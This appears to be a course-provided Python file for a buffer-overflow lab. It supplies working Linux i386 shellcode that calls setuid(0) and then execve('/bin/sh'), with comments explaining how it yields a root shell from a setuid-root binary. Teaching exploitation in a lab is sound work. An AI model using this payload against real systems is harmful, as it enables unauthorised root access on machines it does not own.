# CSE 29 Level 2 — provided Linux x86 (i386) shellcode
#
# Import into your payload:
#   from shellcode import shellcode
#
# Two pieces glued together:
#
#   setuid  — machine code for the setuid(0) system call
#             "make my user id 0 (root)"
#
#   bin_sh  — machine code for execve("/bin/sh", ...)
#             "replace this process with a shell"
#
# Why both?
#   On the course VM you log in as a NORMAL user. The Level 2 binary is
#   setuid-root, so when it runs it has root *privileges available*, but your
#   real uid may still be the student. setuid(0) upgrades the process to root;
#   then execve("/bin/sh") starts a shell that inherits that root identity.
#
# Without a successful overflow into this shellcode, you never get that shell.

# int 0x80 / setuid(0)  (syscall number 23 / 0x17)
setuid = b"1\xdb\x8dC\x17\x99\xcd\x80"

# classic jmp/call execve("/bin/sh") shellcode
bin_sh = (
    b"\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08"
    b"\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

shellcode = setuid + bin_sh
